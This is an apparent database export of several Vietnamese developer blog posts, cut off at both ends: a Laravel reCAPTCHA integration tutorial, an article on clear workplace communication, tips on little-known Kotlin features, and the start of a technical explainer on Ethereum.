các bạn copy dòng code bên dưới vào file .env và thay các thông số key tương ứng với ảnh trên.\n```\nNOCAPTCHA_SITEKEY=secret_site_key\nNOCAPTCHA_SECRET=secret_key\n```\nĐể chắc chắn project đã nhận service này các bạn nên chạy thêm `php artisan composer dumpautoload`.\n\n## Add Route.\nTiếp theo chúng ta di chuyển vào file routes/web.php và thêm đoạn code bên dưới vào.\n```\nRoute::get('captcha-form', 'CaptchaController@captchaForm');\nRoute::post('store-captcha-form', 'CaptchaController@storeCaptchaForm');\n```\n\n## Create CaptchaController.\nTrước tiên chúng ta ra 1 file CaptchaController.\n```\nphp artisan make:controller CaptchaController\n```\nVà thêm đoạn code này vào file controller mới tạo.\n```\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\nuse Validator, Redirect, Response;\nuse App\\User;\n\nclass CaptchaController extends Controller\n{\n    public function captchaForm()\n    {\n        return view('captchaform');\n    }\n    public function storeCaptchaForm(Request $request)\n    {\n        request()->validate([\n            'name' => 'required',\n            'email' => 'required',\n            'mobile_number' => 'required',\n            'g-recaptcha-response' => 'required|captcha',\n        ]);\n\n        dd('successfully validate');\n    }\n}\n```\n\n## Create view.blade.\nTiếp theo là giai đoạn cuối, các bạn vào resources/view và tạo cho mình 1 file captchaform.balde.php và thêm đoạn code vày vào.\n```\n<!doctype html>\n<html lang="en">\n  <head>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n  <meta name="csrf-token" content="{{ csrf_token() }}">\n  <title>Laravel 5.8 Google Recatpcha Verification</title>\n  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />\n  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.js"></script>\n  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.js"></script>\n  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/additional-methods.min.js"></script>\n  <style>\n   .error{ color:red; }\n  </style>\n</head>\n\n<body>\n\n<div class="container">\n    <h2 style="margin-top: 10px;" class="text-center">Laravel 5.8 Google Recatpcha Verification</h2>\n    <br><br><br>\n    <div class="row justify-content-center">\n    <div class="col-md-8">\n    <a href="" class="btn btn-secondary">Back to Post</a>\n    <br><br>\n\n    @if ($message = Session::get('success'))\n    <div class="alert alert-success alert-block">\n        <button type="button" class="close" data-dismiss="alert">×</button>\n          <strong>{{ $message }}</strong>\n    </div>\n    <br>\n    @endif\n\n    <form id="captcha-form" method="post" action="{{url('store-captcha-form')}}">\n      @csrf\n      <div class="form-group">\n        <label for="formGroupExampleInput">Name</label>\n        <input type="text" name="name" class="form-control" id="formGroupExampleInput" placeholder="Please enter name">\n        <span class="text-danger">{{ $errors->first('name') }}</span>\n      </div>\n      <div class="form-group">\n        <label for="email">Email Id</label>\n        <input type="text" name="email" class="form-control" id="email" placeholder="Please enter email id">\n        <span class="text-danger">{{ $errors->first('email') }}</span>\n      </div>\n      <div class="form-group">\n        <label for="mobile_number">Mobile Number</label>\n        <input type="text" name="mobile_number" class="form-control" id="mobile_number" placeholder="Please enter mobile number">\n        <span class="text-danger">{{ $errors->first('mobile_number') }}</span>\n      </div>\n      <div class="form-group">\n        <label for="captcha">Captcha</label>\n          {!! NoCaptcha::renderJs() !!}\n          {!! NoCaptcha::display() !!}\n        <span class="text-danger">{{ $errors->first('g-recaptcha-response') }}</span>\n      </div>\n      <div class="form-group">\n       <button type="submit" class="btn btn-success">Submit</button>\n      </div>\n    </form>\n</div>\n</div>\n</div>\n\n</body>\n</html>\n```\n## Test demo.\nCác bạn bật serve lên ,\n```\nphp artisan serve\nIf you want to run the project diffrent port so use this below command \nphp artisan serve --port=8080\n```\n\nSau đo chạy vào route: `http://localhost:80/captcha-form` để kiểm nghiệm nhé. Ở đây mình port 80 là port mặc đinh khi bật serve, còn các bạn để port bao nhiêu thì thay đổi trên URL cho hợp lý nhé.\n![](https://images.viblo.asia/27801847-6ac2-4fe4-a2ef-f31c4540013a.png)\nĐại khai view của chungs ta sẽ trông như thế này.\nsau khi các bạn nhấp vào phần check book I'm not a robot và điền các thông tin và submit sẽ thấy được dòng chữ ' "successfully validate" do chúng ta đã dd() trong CaptchaController.. các bạn có thể tùy chỉnh phần nó nếu xác thực thành công thì redirect vào dashboard chẳng hạn...vv..\n\n## Tổng Kết:\nThế là mình đã hướng dẫn cho các bạn xong cách làm thế nào để xác thực người dùng bằng google reCaptCha bằng cách install package 'anhskohbo/no-captcha' trong laravel rồi nhé.\nChúc các bạn thành công nhé.	![](https://images.viblo.asia/90e9447a-ba5f-401b-a2e0-7634a3c29814.jpeg)\n\n\nTrong bài viết này,  Mình sẽ triển khai cách xác thực người người dùng bằng Recaptcha trong Laravel 5.8. Mình sẽ viết từng bước hướng dẫn cách sử dụng google captcha bằng cách install package 'anhskohbo / no-captcha' trong ứng dụng laravel 5.8. Và các bạn có thể đơn giản sử dụng mã xác nhận lại google trong mẫu đăng ký của mình.\n\nGoogle ReCaptcha là một hệ thống giống như captcha, cung cấp bảo...	{https://images.viblo.asia/90e9447a-ba5f-401b-a2e0-7634a3c29814.jpeg,https://images.viblo.asia/e5970d32-91cb-4c68-8bf6-886dd0d32ca8.png,https://images.viblo.asia/c32a303c-17a4-4668-a3f8-4cd7514daa18.png,https://images.viblo.asia/27801847-6ac2-4fe4-a2ef-f31c4540013a.png}	1	Tích hợp Google reCAPTCHA v2 trong Laravel 5.8	{captcha,recaptcha,laravel}	0	f	2022-12-18 15:33:38.315+00	2022-12-18 15:33:38.315+00
31919	Trong một buổi nói chuyện, chắc hẳn bạn sẽ gặp những trường hợp mà cùng một nội dung nhưng người này nói rất dễ hiểu, người nghe có thể nắm bắt được ngay bối cảnh, vấn đề của câu chuyện, nhưng có người thì lại nói rất khó hiểu, nghe đi nghe lại cũng không hiểu được ý người đó muốn nói là gì. Vậy điểm khác nhau giữa những người đó là gì?<br>\nBản thân tôi, là một người thường xuyên phải trao đổi với member người Việt và truyền đạt, đặt câu hỏi với người Nhật nhưng thực sự tôi cũng đang loay hoay với cách truyền đạt, đặt câu hỏi làm sao để vừa ngắn gọn, xúc tích mà vẫn truyền tải được ý của mình.<br>\nVới bài viết lần này tôi muốn cùng các bạn có thể tìm hiểu, cải thiện cách trình bày, nói chuyện của mình để có thể dễ truyền đạt tới người nghe nhất.<br>\nQuay lại câu hỏi ở trên, điểm khác nhau đó là gì? Để đi đến được câu hỏi đó, chúng ta hãy cùng trả lời các câu hỏi bên dưới nhé.\n\n### 1. Câu chuyện bắt đầu từ "Kết luận" hay từ "Quá trình"\nVí dụ khi được hỏi "Kết quả buổi họp hôm nay thế nào?", bạn sẽ trả lời thế nào?<br>\nVới người nói chuyện dễ hiểu, họ sẽ bắt đầu đi từ "Kết luận" chẳng hạn như là "Chiều hướng tốt lắm!" hay "Vẫn chưa có tiến triển gì". Và thế là đã trả lời đúng được câu hỏi một cách ngắn gọn mà vẫn cung cấp đúng, đủ nội dung, đạt được mục đích của cuộc hội thoại.<br>\nNhưng người nói chuyện khó hiểu thì họ sẽ trình bày từng quá trình một rằng là "Có vấn đề abc, anh A báo cáo là thế nọ thế chai.Rồi rằng thì là mà..." mà mãi chưa đi đến được kết luận để trả lời cho câu hỏi "Kết quả thế nào?". Vào những tình huống như này đôi khi sẽ có trường hợp người nghe ngắt lời rằng "Tóm lại là kết quả thế nào?", mất nhiều thời gian mà nội dung vẫn thiếu.<br><br>\nNếu là một bộ phim, một cuốn tiểu thuyết thì quả thật quá trình rất quan trọng, giúp người xem hiểu được tình tiết, diễn biến nhưng với một cuộc họp, báo cáo, câu trả lời cho câu hỏi thì thực sự "quá trình" là một thứ rườm ra. Vậy nên để có một buổi nói chuyện hiệu quả, chúng ta hãy bắt đầu đi từ "Kết luận" nhé.\n\n### 2. Nói chuyện "Cụ thể" hay "Trìu tượng"\nVí dụ khi được hỏi “Độ ưu tiên công việc này như thế nào?”<br>\nNgười nói chuyện dễ hiểu sẽ trả lời chi tiết chẳng hạn như “ Trước hết chúng ta cần list up ra các task. Sau đó sẽ set deadline và đánh sô 1~3 cho mức độ quan trọng của các task.Nhân mức đọ quan trọng với số ngày còn lại cho đến deadline, rồi sắp xếp kết quả theo thứ tự kết quả cao lên trên. Và set thứ tự đó chính là mức độ ưu tiên.<br><br>\nCòn với người nói chuyện khó hiểu thì sẽ trả lời đại loại là “ Thì cứ việc gì phải là xong sớm hay việc nào quan trọng thì cứ để độ ưu tiên cao”\nBạn thấy cách nào khiến đối phương dễ hiểu và dễ thực hiện hơn. Đương nhiên là cách trả lời 1 đúng không?. Vậy nên chúng ta hãy nói chuyện một cách cụ thể và chi tiết chứ đừng chung chung, trìu tượng nhé.\n\n### 3. Nói chuyện, trả lời theo kiểu “được hỏi” hay “muốn dãi bày”\nChúng ta đến với ví dụ tiếp theo, câu trả lời cho câu hỏi “Hôm nay khách đến có những ai thế?”<br>\nNgười nói chuyện dễ hiểu thì sẽ trả lời ngắn gọn, xúc tích rằng là “ Có công ty A, B,C đến tham quan công ty.”<br>\nNgười nói chuyện khó hiểu thì sẽ bắt đầu dài dòng nào là “công ty A nói chuyện hay lắm, công ty B thì anh Giám đốc vắng mặt nên đã cho tôi địa chỉ liên lạc …”.<br><br>\nXét về mặt hội thoại thì cũng rất bình thường nhưng về độ dễ hiểu của câu chuyện thì rõ ràng trả lời một cách ngắn gọn xúc tích sẽ có hiệu quả cao hơn.\n\n### 4. “Thay đổi cách dùng từ tùy theo phản ứng của đối phương” hay “duy nhất một cảm xúc”\nKhi muốn dùng thuật ngữ<br>\nNgười nói chuyện dễ hiểu thì sẽ dùng thuật ngữ và nhìn biểu hiện của đối phương để lựa chọn từ ngữ cho lần nói chuy’ện tiếp theo. Ngược lại, nếu đối phương hiểu được thuật ngữ đó thì sẽ tích cực sử dụng. Tức là thay đổi từ ngữ một cách linh hoạt.<br><br>\nNgười nói chuyện khó hiểu thì sẽ chẳng quan tâm đối phương có hiểu ý nghĩa của những từ thuật ngữ mình đang nói không mà chỉ thao thao bất tuyệt.<br><br>\nNói chuyện cũng là một loại giao tiếp nên cũng cần thêm những yếu tố như biểu cảm, cảm xúc chứ không chỉ riêng từ ngữ.\n\n### 5. “Đi từ tổng quát đến chi tiết” hay ngược lại\nVí dụ khi muốn giải thích cách chơi cờ tướng cho người không biết đến Cờ tướng.<br>\nVới người nói chuyện dễ hiểu thị họ sẽ giải thích rule tổng quát nhất cho đối phương rằng là “Đây là một trò chơi với 2 người chơi.Người chơi sẽ di chuyển những quân cờ để làm sao có thể ăn được quân Tướng của đối phương thì sẽ thắng.”Tiếp theo thì sẽ giai thích đến chi tiết chẳng hạn như”Các loại quân cờ”, “Cách xếp quân lúc bắt đầu ván cờ”,”Cách di chuyển các quân cờ”,”Cách dùng các quân cờ đã ăn được của đối phương”…Tức là họ sẽ giải thích đi từ tổng quan đến chi tiết.<br><br>\nNgười nói chuyện khó hiểu thì sẽ đi ngay vào giải thích “Cách di chuyển các quân cờ”, “Luật chơi” hoặc có thể sẽ giải thích đến những “Mánh khóe”. Họ nói chuyện đi từ chi tiết mà không nghĩ đến các cấu tạo, thành phần làm nên một trò chơi Cờ tướng.<br><br>\nChúng ta có thể chia sẻ về một hình dung nào đó bằng việc đi từ tổng quát của nó.Như vậy sễ dễ hiểu, dễ hình dung hơn.\n\n### 6. “Nói chuyện theo tốc độ hiểu của đối phương” hay”Theo base của bản thân?\nVí dụ khi bạn phải giải thích với các e lớp 4 về định nghĩa “Internet là gì?”<br>\nNgười nói chuyện dễ hiểu thì sẽ bắt đầu từ “Các em có biết Internet không?”Sau khi các em đã có hình dung  như “máy tính ở nhà nè”, “đây là một cái máy có bàn phím để gõ chữ mà mình thấy trường nè”,”cái điện thoại Smartphone nè”..v.v, khi đấy bạn mới dẫn dắt rằng là “ vậy là máy tính kết nối với nhau đúng không nào?” rồi lấy ví dụ chẳng hạn như là mail điện tử. Sau khi người nghe đã hiểu được những khái niệm đó thì cuối cùng bạn sẽ giải thích rằng “Thứ kết nối những máy tính với nhau người ta gọi đólà Internet”.<br><br>\nNgười nói chuyện khó hiểu thì sẽ giải thích luôn rằng “Thứ kết nối những máy tính với nhau người ta gọi đó là Internet” mà chẳng cần biết tốc độ hiểu của người nghe ra sao, có kịp hiểu hay không. Người nghe sẽ phải hiểu nhiều khái niệm cùng lúc nên chỉ cần theo kịp câu chuyện thôi cũng đã khó khăn rồi chứ chưa nói đến là hình dung và hiểu được những khái niệm đang nói tới.<br><br>\nVì vậy bạn cố gắng là nói chuyện cần kết hợp với tốc độ hiểu của người nghe. Để xác nhận người nghe có hiểu đúng hay không, chúng ta có thể đặt câu hỏi “Tôi nói đến đây bạn đã hiểu chưa?”để nắm bắt kịp thời.\n\n### 7. Hạn chế sự dụng từ ngữ không cụ thể hay tận dụng những từ ngữ đó\nVí dụ khi muốn nhờ ai đó gửi đơn từ gì đó cho trưởng phòng.<br>\nNgười nói chuyện dễ hiểu thì sẽ nói cẩn thận rằng là “Bạn đưa đơn này cho trưởng phòng nhé”.<br>\nNgười nói chuyện khó hiểu thì sẽ nói “Đưa cái này cho người đó nhé.”. Nếu như người nghe không biết đến bối cảnh và tình trạng như thế nào thì chắc sẽ không thể hiểu được cái này là gì?, người đó là ai?.<br><br>\nNhững từ không cụ thể như “Cái này/ đó/kia”,”Người nọ người kia” có thể sẽ tiện trong giao tiêó nhưng các bạn chú ý khi nói chuyện cố gắng tránh sử dụng những từ ngữ này nhé.\n\n### 8. Lạc đề?\nVí dụ trong buổi họp trao đổi về vấn đề đang xảy ra với hệ thống, và đang nói đến phân công vai trò.<br>\nNgười nói chuyện dễ hiểu sẽ chuyển sang chủ đề tiếp theo chỉ khi đã trao đổi xong vấn đề nào đó.<br>\nTuy nhiên, với người nói chuyện khó hiểu thì đang trao đổi phân công vai trò cho ai thì lại đề cập đến việc chức năng tiếp theo bao giờ phải hoàn thành,trong khi đáng nhẽ ra đó là câu chuyện mà phải sau khi “phân công vai trò” xong thì ới đưa ra tiếp đề bàn luận.<br><br>\nKhi câu chuyện đang đi lệch hướng, mất thời gian thì chúng ta cần phải điều chỉnh lại để câu chuyện đi đúng hướng ban đầu. Chúng ta sẽ chỉ nói đến câu chuyện tiếp theo khi nội dung câu chuyện thứ nhất đã kết thúc.<br><br>\n\nTóm lại khi chúng ta nói đến một vấn đề gì cũng nên đi từ kết luận để người nghe nắm được kết quả,tổng quát chung. Sau đó sẽ đi đến những cái chi tiết, cụ thể. Tránh nói chung chung dễ gây hiểu sai, hiểu nhầm cho người nghe. Và cần theo dõi người nghe có đang hiểu những gì mình nói không để điều chỉnh cho phù hợp cũng nhưng tránh nói lạc đề khi cho câu chuyện trở lên xáo trộn, khó nắm bắt.\n\n(Tài liệu tham khảo:https://liginc.co.jp/life/business/91331)	Trong một buổi nói chuyện, chắc hẳn bạn sẽ gặp những trường hợp mà cùng một nội dung nhưng người này nói rất dễ hiểu, người nghe có thể nắm bắt được ngay bối cảnh, vấn đề của câu chuyện, nhưng có người thì lại nói rất khó hiểu, nghe đi nghe lại cũng không hiểu được ý người đó muốn nói là gì. Vậy điểm khác nhau giữa những người đó là gì?<br>\nBản thân tôi, là một người thường xuyên phải trao đổi ...	{}	1	8 điểm khác nhau giữa người truyền đạt tốt và người truyền đạt không tốt	{communication}	0	f	2022-12-18 15:33:38.36+00	2022-12-18 15:33:38.36+00
31915	>“The only true wisdom is in knowing you know nothing.” ― Socrates**\n\nTôi đã sử dụng Kotlin được gần hai năm và tôi bắt đầu từ việc đưa nó vào dự án đồ chơi dành cho các cuộc đàm phán công nghệ của tôi. Ngay từ dòng đầu tiên, tôi đã biết rằng ngôn ngữ này sẽ thay đổi cuộc đời tôi, và bạn biết gì không? Tôi đã hoàn toàn đúng.\n\n\nKiến thức làm cho bạn tốt hơn và đó là lý do tại sao hầu hết các kỹ sư thành công của thế giới không ngừng học hỏi những điều mới. Dưới đây là danh sách của tôi về năm điều ít được biết đến về Kotlin và tôi hy vọng bạn sẽ tìm thấy ít nhất ba điều đáng để biết.\n\n\n\n-----\n\n#### 1. Name your imports\nTrong Kotlin, `imports` được trình biên dịch sử dụng để cho phép bạn đặt tên các lớp của mình theo tên không đủ tiêu chuẩn của chúng. Điều gì xảy ra nếu bạn có xung đột đặt tên? Chuyện buồn xảy ra!\n\n```kotlin\npackage com.code.sliski.userinfoscreen.ui\n\nimport ...\n\nimport android.view.View // Conflict\n\nclass UserInfoFragment : Fragment(), com.code.sliski.userinfoscreen.ui.View { // Conflict\n\n    override fun onCreateView(inflater: LayoutInflater, \n                              container: ViewGroup?, \n                              state: Bundle?): View = // Conflict\n            inflater.inflate(user_info_fragment,\n                             container,\n                             false)\n}\n\ninterface View // Conflict\n```\n\n###\nCá nhân, tôi ghét sử dụng tên package đủ điều kiện trong mã của mình vì nó làm giảm tính dễ đọc và rõ ràng. **Trong Python, bạn có thể đặt tên cho imports của mình để khắc phục các xung đột và Kotlin cũng hỗ trợ nó.**\n###\n\n```kotlin\nimport android.view.View as AndroidView // Named import\n\nclass UserInfoFragment : Fragment(), View {\n    \n    override fun onCreateView(inflater: LayoutInflater, \n                              container: ViewGroup?, \n                              state: Bundle?): AndroidView = // Using named import\n}\n\n```\n\n#\n#### 2. Change companion object name\n\n`Companion object` đã được giới thiệu để thay thế các `static` member. Nó không chỉ để khai báo các thuộc tính tĩnh mà còn để đặt tên cho chúng. Làm sao? Hãy xem ví dụ này.\n\n```kotlin\n// Using in Java\nCustomButton button = new CustomButton(context);\nbutton.setVisibility(CustomButton.Companion.getGONE());\n\n// Using in Kotlin\nval button = CustomButton(context)\nbutton.visibility = CustomButton.VISIBLE\n\nclass CustomButton(context: Context?) : View(context) {\n    companion object {\n        // Visibility\n        val GONE = 1\n        val VISIBLE = 2\n        val INVISIBLE = 3\n    }\n}\n```\n\nTheo mặc định, Kotlin tạo một static nested class `Companion` cho mọi đối tượng companion. Đó là lý do tại sao bạn cần sử dụng CustomButton.Compmate để truy cập các thành viên tĩnh từ mã Java (bạn cũng có thể sử dụng nó trong Kotlin nhưng không cần thiết). **Kotlin cho phép bạn thay đổi tên mặc định của đối tượng companion thành bất kỳ tên nào bạn muốn**. Mã tái cấu trúc trông như thế này.\n\n```kotlin\n// Using in Java\nCustomButton button = new CustomButton(context);\nbutton.setVisibility(CustomButton.Visibility.getGONE());\n\n...\n\nclass CustomButton(context: Context?) : View(context) {\n    companion object Visibility {\n        val GONE = 1\n        val VISIBLE = 2\n        val INVISIBLE = 3\n    }\n}\n```\n\nHạn chế lớn nhất là Kotlin không hỗ trợ nhiều đối tượng companion cho một lớp. Nó sẽ là tuyệt vời để nhóm các thuộc tính tĩnh.\n\n```kotlin\nval button = CustomButton(context)\nbutton.visibility = CustomButton.Visibility.VISIBLE\nbutton.foregroundGravity = CustomButton.ForegroundGravity.LEFT\n\nclass CustomButton(context: Context?) : View(context) {\n\n    companion object Visibility {\n        val VISIBLE = 1\n        val INVISIBLE = 2\n    }\n\n    companion object ForegroundGravity {\n        val LEFT = 1\n        val RIGHT = 2\n    }\n}\n```\n\n#\n#### 3. Compose functions\nTôi cá là bạn đã sử dụng các tham chiếu hàm trước đây nhưng bạn đã bao giờ thử sử dụng chúng để soạn các hàm chưa? Hãy tưởng tượng rằng bạn muốn ánh xạ một loạt các mức giá theo giá được đánh thuế, giảm giá và làm tròn. Sử dụng phương pháp phổ biến, bạn sẽ kết thúc với một cái gì đó như thế này.\n```kotlin\nval prices = listOf(21.8, 232.5, 231.3)\nprices.map(::taxed)\n      .map(::discounted)\n      .map(::rounded)\n\nfun taxed(value: Double): Double = value * 1.4\nfun discounted(value: Double): Double = value * 0.9\nfun rounded(value: Double): Double = Math.round(value).toDouble()\n```\n\nMã tốt hơn đây \n```kotlin\nval prices = listOf(21.8, 232.5, 231.3)\nval taxedDiscountedRounded = compose(::taxed, ::discounted, ::rounded)\nprices.map(taxedDiscountedRounded)\n\nfun <A, B> compose(f: (A) -> A,\n                   g: (A) -> A,\n                   h: (A) -> B): (A) -> B = { x -> h(g(f(x))) }\n\nfun taxed(value: Double): Double = value * 1.4\nfun discounted(value: Double): Double = value * 0.9\nfun rounded(value: Double): Double = Math.round(value).toDouble()\n```\n\n**Thành phần chức năng không chỉ làm cho mã của bạn sạch hơn mà còn nhanh hơn.** Một khi bạn hiểu nó, bạn sẽ có thể sáng tác hầu hết mọi thứ.\n\n#\n#### 4. Change name of generated class\n\nCác hàm mở rộng là một trong những tính năng hấp dẫn nhất trong Kotlin nhưng sử dụng chúng trong mã Java có thể khiến bạn đau đầu nghiêm trọng. Nó là xấu xí và bên cạnh đó không có gì khác như gọi một phương thức tĩnh.\n\n```kotlin\n// Main.java\npublic static void main(String[] args) {\n    String name = null;\n\n    AnyKt.ifNull(name, new Function1<Object, Unit>() {\n        @Override\n        public Unit invoke(Object o) {\n            return null;\n        }\n    });\n}\n\n// Any.kt\ninline fun <T> T?.ifNull(function: (T?) -> Unit) {\n    if (this == null) function(this)\n}\n```\n\nKotlin tạo lớp AnyKt với một phương thức tĩnh để bạn có thể sử dụng nó trong Java. **Có một tùy chọn để thay đổi tên của lớp được tạo để đạt được khả năng đọc tốt hơn.**\n\n```kotlin\n// Main.java\npublic static void main(String[] args) {\n    String name = null;\n\n    Nullcheck.ifNull(name, new Function1<Object, Unit>() {\n        @Override\n        public Unit invoke(Object o) {\n            return null;\n        }\n    });\n}\n\n// Any.kt\n@file:JvmName("Nullcheck")\npackage ...\n\ninline fun <T> T?.ifNull(function: (T?) -> Unit) {\n    if (this == null) function(this)\n}\n```\n\n#\n#### 5. Validate an assignment and “veto” it\nCách thức mà Kotlin xử lý ủy nhiệm là khá ngoạn mục, vì vậy nếu bạn không quen thuộc với nó, bạn hoàn toàn nên kiểm tra bài viết của tôi: "Zero boilerplate delegation in Kotlin". Bên cạnh "class delegation", còn có một cơ chế thú vị gọi là "delegated properties" được sử dụng để khởi tạo thuộc tính lười biếng. Làm thế nào bạn sẽ giải quyết tình huống mà bạn cần để có thể chặn một nhiệm vụ và "veto" nó? Có cách nào sạch sẽ để làm điều đó? Có, có!\n\n```kotlin\nvar price: Double by Delegates.vetoable(0.0) { prop, old, new ->\n    validate(new)\n}\n\nfun validate(price: Double) : Boolean {\n    // Validation checks\n}\n```\n\nMẫu cho thấy việc sử dụng một built-in vetoable delegate. Lambda chuyển đến quyền phủ quyết được gọi trước khi gán giá trị mới cho property. Trả về false từ lambda cho phép bạn "phủ quyết" bài tập nhưng nếu bạn muốn chuyển nó qua trả về true.\n\nTham khảo : https://proandroiddev.com/5-small-things-you-probably-dont-know-about-kotlin-255261940de6	>“The only true wisdom is in knowing you know nothing.” ― Socrates**\n\nTôi đã sử dụng Kotlin được gần hai năm và tôi bắt đầu từ việc đưa nó vào dự án đồ chơi dành cho các cuộc đàm phán công nghệ của tôi. Ngay từ dòng đầu tiên, tôi đã biết rằng ngôn ngữ này sẽ thay đổi cuộc đời tôi, và bạn biết gì không? Tôi đã hoàn toàn đúng.\n\nKiến thức làm cho bạn tốt hơn và đó là lý do tại sao hầu hết các kỹ s...	{}	1	Năm điều nhỏ bạn có thể không biết về Kotlin	{android}	0	f	2022-12-18 15:33:38.388+00	2022-12-18 15:33:38.388+00
31775	![](https://images.viblo.asia/cbed034e-0379-46fb-8897-dfac2affc524.png)\n\n## Giới thiệu\nTrong cộng đồng Blockchain nói riêng cũng như những người không chuyên nói chung, thì Ethereum là cái tên nổi tiếng thứ 2 sau Bitcoin. Khác với Bitcoin là hệ thống tiền điện tử ngang hàng (Blockchain 1.0), Ethereum cho phép người tham gia có thể xây dựng những ứng dụng trên nền tảng này dựa trên hợp đồng thông minh (smart contract), đem các ứng dụng của Blockchain thoát ra khỏi sự đánh đồng với tiền ảo trong mắt nhiều người.\n\nBài viết này nhằm giải thích cách Ethereum hoạt động ở cấp độ kỹ thuật. Chúng ta sẽ đi tìm hiểu Ethereum từ cái nhìn tổng quan về hệ thống cho đến giải thích về các khái niệm quan trọng trong Ethereum như tài khoản, block, giao dịch, gas, EVM,... Hy vọng sau bài viết này, mọi người có thể hiểu thêm và chi tiết hơn cách Ethereum hoạt động.\n\n## Mô hình tổng quan về Ethereum\nBlockchain Ethereum về cơ bản là một cỗ máy trạng thái dựa trên các giao dịch. Trong khoa học máy tính,thuật ngữ một máy trạng thái đề cập đến thứ gì đó sẽ đọc một loạt các đầu vào và dựa trên các đầu vào đó, sẽ chuyển sang trạng thái mới.\n![](https://images.viblo.asia/b0195ff4-3838-4ba4-9617-02900dc0bad9.png)\n\nVới máy trạng thái Ethereum, nó bắt đầu với trạng thái nguyên thủy (genesis state). Khi các giao dịch được thực hiện, trạng thái nguyên thủy này chuyển sang các trạng thái khác hay nói chi tiết hơn thì mỗi block sẽ là mỗi trạng thái khác nhau. Tại bất kỳ thời điểm nào, trạng thái của block mới nhất sẽ đại diện cho trạng thái hiện tại của Ethereum.\n\n![](https://images.viblo.asia/b0195ff4-3838-4ba4-9617-02900dc0bad9.png)\n\nTrạng thái của Ethereum có hàng triệu giao dịch. Các giao dịch này được nhóm thành các block trên mạng. Một block chứa một loạt các giao dịch và mỗi block được kết nối với block trước đó.\n\n![](https://images.viblo.asia/748a44d9-e4a0-48e9-8e9b-63abe397abd1.png)\n\nĐể chuyển đổi từ trạng thái này sang trạng thái khác, một giao dịch phải hợp lệ. Để một giao dịch được coi là hợp lệ, nó phải trải qua quá trình xác nhận được gọi là mining (đào coin). Mining là khi một nhóm các nút (tức là máy tính) sử dụng tài nguyên tính toán của họ để tạo ra một khối chứa các giao dịch hợp lệ.\n\nBất kỳ nút nào trên mạng tự khai báo là thợ mỏ (miner) có thể cố gắng tạo và xác thực một block. Rất nhiều thợ mỏ từ khắp nơi trên thế giới cố gắng tạo và xác nhận các block cùng một lúc. Để đào được một block thì các thợ mỏ phải giải quyết một bài toán mã băm, khi thợ mỏ giải xong bài toán và broadcast lên mạng blockchain, nó sẽ được các nút khác xác nhận là hợp lệ nếu giải pháp giải quyết bài toán mã băm là đúng.\n\nNhưng để block của thợ mỏ đó được đưa vào blockchain thì phải đảm bảo rằng thợ mỏ đó là người đầu tiên, nhanh nhất tìm ra giải pháp bài toán của block đó. Sau đó, thợ mỏ đó sẽ được thưởng một lượng Ether. Toàn bộ quá trình đào một block trong Ethereum cũng như Bitcoin được gọi là bằng chứng công việc (proof of work).\n\nBạn có thể tự hỏi: Điều gì đảm bảo rằng tất cả mọi người đều vào cùng tương tác trên một chuỗi block ? Làm thế nào chúng ta có thể chắc chắn rằng không có tồn tại một số những người khai thác, họ sẽ quyết định tạo ra chuỗi block của riêng họ?\n\nTrước đó, chúng tôi đã định nghĩa một blockchain là một máy trạng thái thay đổi qua các block. Sử dụng định nghĩa này, chúng ta có thể hiểu trạng thái hiện tại chính xác là một sự thật duy nhất, mà mọi người phải chấp nhận. Có nhiều trạng thái (hoặc chuỗi) sẽ phá hỏng toàn bộ hệ thống, bởi vì không thể thống nhất trạng thái nào là đúng. Nếu các chuỗi được phân kỳ, bạn có thể sở hữu 10 đồng tiền trên một chuỗi, 20 trên chuỗi khác và 40 trên chuỗi khác. Trong kịch bản này, sẽ không có cách nào để xác định chuỗi nào là hợp lệ nhất.\n\nBất cứ khi nào nhiều chuỗi được tạo ra, khi đó xảy ra hiện tượng phân nhánh (fork). Chúng ta muốn tránh sự phân nhánh, bởi vì chúng phá vỡ hệ thống và buộc mọi người chọn chuỗi mà họ tin tưởng vào.\n\n![](https://images.viblo.asia/e6b4e434-5230-4467-b0d2-4b934937c435.png)\n\nĐể xác định đâu là chuỗi block chính (hợp lệ) và ngăn chặn việc có nhiều chuỗi block. Ethereum sử dụng một giao thức có tên là “GHOST”. GHOST được viết tắt từ Greedy Heaviest Observed Subtree.\n\nNói một cách đơn giản, giao thức GHOST nói rằng chúng ta phải chọn chuỗi block có nhiều tính toán nhất được thực hiện trên mạng blockchain làm chuỗi chính (chuỗi nặng nhất).  Độ nặng của chuỗi trong Ethereum phụ thuộc vào số lượng block trong chuỗi đó và các uncle block của nó (sẽ đề cập chi tiết hơn về uncle block ở phần sau).\n\n![](https://images.viblo.asia/22deaf79-abe8-482c-a31c-0cbb99e32f6a.png)\n\nChúng ta đã cùng nhau có cái nhìn tổng quan về cách hoạt động của Ethereum, phần tiếp theo chúng ta sẽ cùng đi tìm hiểu chi tiết về các thành phần trong Ethereum bao gồm:\n* Tài khoản\n* Trạng thái\n* Gas và phí giao dịch\n* Giao dịch\n* Block\n* Thực thi giao dịch\n\n## Tài khoản\nTrạng thái của Ethereum bao gồm nhiều đối tượng nhỏ (các tài khoản trực tuyến) có thể tương tác với nhau thông qua cơ chế truyền message. Bất kỳ tài khoản nào cũng có một định danh duy nhất (địa chỉ) là 160 bit.\n\nEthereum có 2 loại tài khoản:\n* Tài khoản người dùng (Externally owned accounts) được quản lý bởi private key và không có chứa mã nguồn.\n* Tài khoản hợp đồng chứa mã nguồn và được quản lý bởi mã nguồn trong hợp đồng, tài khoản hợp đồng chỉ có địa chỉ mà không có private key như tài khoản người dùng.\n\n![](https://images.viblo.asia/07060d01-b52a-4d0a-881e-19eb4a2f2f14.png)\n\n### Tài khoản người dùng và tài khoản hợp đồng\nTài khoản người dùng có thể gửi message đến các tài khoản người dùng khác hoặc đến các tài khoản hợp đồng khác bằng cách tạo và ký một giao dịch bằng private key của nó. Một message giữa hai tài khoản người dùng chỉ đơn giản là một giao dịch chuyển giá trị. Nhưng một message từ tài khoản người dùng đến tài khoản hợp đồng sẽ kích hoạt mã nguồn của tài khoản hợp đồng, cho phép nó thực hiện nhiều hành 